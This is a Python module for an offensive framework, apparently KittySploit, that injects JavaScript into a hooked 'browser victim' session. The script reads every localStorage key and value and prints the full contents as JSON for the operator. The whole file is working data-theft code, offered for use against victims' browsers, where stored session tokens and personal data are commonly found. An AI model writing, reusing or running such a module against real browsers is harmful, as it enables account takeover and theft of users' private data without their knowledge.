from kittysploit import *
import json

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Get Local Storage",
		"description": "Extract all data from localStorage of the browser victim",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}	

	def run(self):
		"""Extract all localStorage data from the target browser session"""
		code_js = """
		(function() {
			try {
				if (!window.localStorage) {
					return JSON.stringify({
						error: "localStorage is not available",
						available: false
					});
				}
				
				const storage = {};
				for (let i = 0; i < localStorage.length; i++) {
					const key = localStorage.key(i);
					storage[key] = localStorage.getItem(key);
				}
				
				return JSON.stringify({
					available: true,
					count: Object.keys(storage).length,
					data: storage
				});
			} catch (e) {
				return JSON.stringify({
					error: e.message,
					available: false
				});
			}
		})();
		"""
		
		result = self.send_js_and_wait_for_response(code_js, timeout=5.0)
		
		if not result:
			print_error("Failed to retrieve localStorage data")
			return False
		
		try:
			data = json.loads(result)
			
			if not data.get('available', False):
				error_msg = data.get('error', 'Unknown error')
				print_error(f"localStorage is not available: {error_msg}")
				return False
			
			storage_data = data.get('data', {})
			count = data.get('count', 0)
			
			if count == 0:
				print_warning("localStorage is empty")
				return True
			
			print_success(f"Found {count} item(s) in localStorage:")
			print_info("=" * 80)
			
			for key, value in storage_data.items():
				# Truncate long values for display
				display_value = value
				if len(display_value) > 100:
					display_value = display_value[:100] + "..."
				
				print_info(f"  Key: {key}")
				print_info(f"  Value: {display_value}")
				print_info("-" * 80)
			
			# Also print full JSON for easy copy
			print_info("=" * 80)
			print_status("Full localStorage data (JSON):")
			print_info(json.dumps(storage_data, indent=2))
			
			return True
			
		except json.JSONDecodeError as e:
			print_error(f"Failed to parse localStorage data: {e}")
			print_debug(f"Raw response: {result}")
			return False
		except Exception as e:
			print_error(f"Error processing localStorage data: {e}")
			return False
